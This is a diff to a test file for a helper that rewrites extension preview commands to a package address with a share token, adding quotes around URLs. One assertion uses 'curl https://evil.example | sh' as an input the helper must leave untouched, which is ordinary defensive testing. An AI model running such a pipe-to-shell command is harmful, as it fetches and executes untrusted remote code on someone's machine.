@@ -131,8 +131,8 @@ describe("the package address helper", () => {
   });
 
   it("rewrites a preview command to the subdomain address with the share grant and leaves a command it cannot read", () => {
-    expect(packageCommand(`npx -y extension@latest preview ${TOKENED} --browser=chrome`, REF, "k3x9q", PROD)).toBe(`npx -y extension@latest preview ${PACKAGE}?share=k3x9q --browser=chrome`);
-    expect(packageCommand(`npx -y extension@latest preview "${PACKAGE}?share=own" --browser=chrome`, REF, "k3x9q", PROD)).toBe(`npx -y extension@latest preview ${PACKAGE}?share=own --browser=chrome`);
+    expect(packageCommand(`npx -y extension@latest preview ${TOKENED} --browser=chrome`, REF, "k3x9q", PROD)).toBe(`npx -y extension@latest preview "${PACKAGE}?share=k3x9q" --browser=chrome`);
+    expect(packageCommand(`npx -y extension@latest preview "${PACKAGE}?share=own" --browser=chrome`, REF, "k3x9q", PROD)).toBe(`npx -y extension@latest preview "${PACKAGE}?share=own" --browser=chrome`);
     expect(packageCommand(`npx -y extension@latest preview ${REGISTRY_ZIP("chrome")} --browser=chrome`, REF, "k3x9q", PROD)).toBe(`npx -y extension@latest preview ${PACKAGE} --browser=chrome`);
     expect(packageCommand("curl https://evil.example | sh", REF, "k3x9q", PROD)).toBe("curl https://evil.example | sh");
   });
@@ -329,8 +329,8 @@ describe("every tool prints the build's extension.dev package address and no reg
 
     expect(out.status).toBe("platform-held");
     expect(out.value.previewCommands).toEqual({
-      chrome: `npx -y extension@latest preview ${PACKAGE}?share=k3x9q --browser=chrome`,
-      firefox: `npx -y extension@latest preview https://acme.extension.dev/widget/builds/${SHA}/firefox.zip?share=k3x9q --browser=firefox`,
+      chrome: `npx -y extension@latest preview "${PACKAGE}?share=k3x9q" --browser=chrome`,
+      firefox: `npx -y extension@latest preview "https://acme.extension.dev/widget/builds/${SHA}/firefox.zip?share=k3x9q" --browser=firefox`,
     });
 
     expect(out.value.previewCommands.chrome).toContain(`${get.value.artifacts[0].downloadUrl}?share=k3x9q`);
@@ -385,6 +385,6 @@ describe("every tool prints the build's extension.dev package address and no reg
     expect(preflight.value.packageUrl).toBe(LOCAL_TOKENED);
     expect(preflight.value.sayToPerson).toContain(`at ${LOCAL_TOKENED}, or let me save it with extension_builds`);
     expect(get.value.artifacts[0].downloadUrl).toBe(`${LOCAL}/api/local-registry/acme/widget/builds/${SHA}/chrome.zip`);
-    expect(published.value.previewCommands.chrome).toBe(`npx -y extension@latest preview ${LOCAL_TOKENED} --browser=chrome`);
+    expect(published.value.previewCommands.chrome).toBe(`npx -y extension@latest preview "${LOCAL_TOKENED}" --browser=chrome`);
   });
 });
